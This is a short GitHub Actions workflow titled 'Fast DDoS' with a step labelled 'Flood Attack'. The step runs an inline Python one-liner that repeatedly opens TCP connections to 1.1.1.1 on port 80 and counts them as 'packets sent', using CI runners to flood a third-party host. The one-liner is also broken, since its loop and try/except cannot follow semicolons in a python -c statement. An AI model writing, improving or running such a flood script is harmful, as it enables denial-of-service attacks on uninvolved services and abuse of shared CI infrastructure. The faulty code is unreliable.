name: "Fast DDoS"
on: workflow_dispatch
jobs:
  flood:
    runs-on: ubuntu-latest
    steps:
      - name: "Flood Attack"
        run: "python3 -c \"import socket,time;t='1.1.1.1';p=80;print('Flooding',t,p);c=0;for i in range(100):try:s=socket.socket();s.settimeout(1);s.connect((t,p));s.close();c+=1;except:pass;print(f'Sent {c} packets')\""
